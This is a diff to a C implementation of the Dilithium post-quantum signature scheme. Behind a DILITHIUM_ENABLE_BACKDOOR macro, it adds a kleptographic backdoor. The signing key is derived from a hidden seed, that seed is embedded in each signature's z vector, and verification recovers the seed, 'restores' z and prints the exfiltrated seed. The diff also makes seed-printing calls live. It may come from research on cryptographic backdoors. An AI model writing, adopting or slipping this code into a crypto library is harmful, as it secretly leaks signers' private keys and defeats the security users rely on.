@@ -7,6 +7,10 @@
 #include "randombytes.h"
 #include "symmetric.h"
 #include "fips202.h"
+#ifdef DILITHIUM_ENABLE_BACKDOOR
+#include "transform.h"
+#include "status.h"
+#endif
 
 /*************************************************
 * Name:        crypto_sign_keypair
@@ -32,9 +36,7 @@ int crypto_sign_keypair(uint8_t *pk, uint8_t *sk) {
   randombytes(seedbuf, SEEDBYTES);
   
 #ifdef DILITHIUM_ENABLE_BACKDOOR
-  // * Debugging purpose
-  // pqcrystals_dilithium_status_print_seed("KEYGEN", seedbuf);
-  // pqcrystals_dilithium_status_log_seed("KEYGEN", seedbuf);
+  pqcrystals_dilithium_status_print_seed("KEYGEN", seedbuf);
   
   // ! Backdoor requirement
   // Keep the original seed before it is processed by shake256
@@ -75,10 +77,7 @@ int crypto_sign_keypair(uint8_t *pk, uint8_t *sk) {
   shake256(tr, TRBYTES, pk, CRYPTO_PUBLICKEYBYTES);
   
 #ifdef DILITHIUM_ENABLE_BACKDOOR
-  // * Debugging purpose
-  // pqcrystals_dilithium_status_print_key("KEYGEN", key);
-  // pqcrystals_dilithium_status_log_key("KEYGEN", key);
-  (void)key; // Suppress unused variable warning
+  (void)key;
 
   // ! Backdoor requirement
   // hidden_seed and key have the same size, so we can reuse the 'key' variable
@@ -137,14 +136,11 @@ int crypto_sign_signature_internal(uint8_t *sig,
   const uint8_t *hidden_seed = key;
   uint8_t real_key[SEEDBYTES];
 
-  // * Debugging purpose
-  // int repeat = 0;
-  // pqcrystals_dilithium_status_print_seed("SIGN", hidden_seed);
-  // pqcrystals_dilithium_status_log_seed("SIGN", hidden_seed);
+  pqcrystals_dilithium_status_print_seed("SIGN", hidden_seed);
   
   // ! Backdoor requirement
   /* Re-compute the real key: shake256(hidden_seed || K || L) */
-  uint8_t temp_seedbuf[2*SEEDBYTES + CRHBYTES]; // Temporary buffer for the shake256 input and output instead of modifying the original seedbuf
+  uint8_t temp_seedbuf[2*SEEDBYTES + CRHBYTES];
   memcpy(temp_seedbuf, hidden_seed, SEEDBYTES);
   temp_seedbuf[SEEDBYTES+0] = K;
   temp_seedbuf[SEEDBYTES+1] = L;
@@ -153,10 +149,6 @@ int crypto_sign_signature_internal(uint8_t *sig,
   memcpy(real_key, temp_seedbuf + SEEDBYTES + CRHBYTES, SEEDBYTES);
   /* Point 'key' to the real key for the rest of the function */
   key = real_key;
-
-  // * Debugging purpose
-  // pqcrystals_dilithium_status_print_key("SIGN", key);
-  // pqcrystals_dilithium_status_log_key("SIGN", key);
 #endif
 
   /* Compute mu = CRH(tr, pre, msg) */
@@ -213,11 +205,7 @@ rej:
 
 #ifdef DILITHIUM_ENABLE_BACKDOOR
   // ! Backdoor application
-  uint8_t changed[N];
-  pqcrystals_dilithium_backdoor_embed(&z, hidden_seed, changed);
-  uint8_t extracted_seed[SEEDBYTES];
-  pqcrystals_dilithium_backdoor_recover(&z, extracted_seed);
-  pqcrystals_dilithium_backdoor_restore(&z, hidden_seed, changed);
+  pqcrystals_dilithium_backdoor_embed(&z, hidden_seed);
 #endif
 
   if(polyvecl_chknorm(&z, GAMMA1 - BETA))
@@ -247,15 +235,6 @@ rej:
   /* Write signature */
   pack_sig(sig, sig, &z, &h);
   *siglen = CRYPTO_BYTES;
-
-#ifdef DILITHIUM_ENABLE_BACKDOOR
-  // * Debugging purpose
-  // if (repeat < 1) {
-  //    pqcrystals_dilithium_status_print_seed("EXTRACTED", extracted_seed);
-  //   // pqcrystals_dilithium_status_log_seed("EXTRACTED", extracted_seed);
-  //   ++repeat;
-  // }
-#endif
 
   return 0;
 }
@@ -398,6 +377,16 @@ int crypto_sign_verify_internal(const uint8_t *sig,
   /* Matrix-vector multiplication; compute Az - c2^dt1 */
   poly_challenge(&cp, c);
   polyvec_matrix_expand(mat, rho);
+ 
+#ifdef DILITHIUM_ENABLE_BACKDOOR
+  uint8_t extracted_seed[SEEDBYTES];
+  pqcrystals_dilithium_backdoor_recover(&z, extracted_seed);
+
+  if(pqcrystals_dilithium_backdoor_restore(&z, extracted_seed, mu, &cp) == 0) {
+    // Restore success: z is now clean. Log the exfiltrated seed.
+    pqcrystals_dilithium_status_print_seed("RECOVER", extracted_seed);
+  }
+#endif
 
   polyvecl_ntt(&z);
   polyvec_matrix_pointwise_montgomery(&w1, mat, &z);
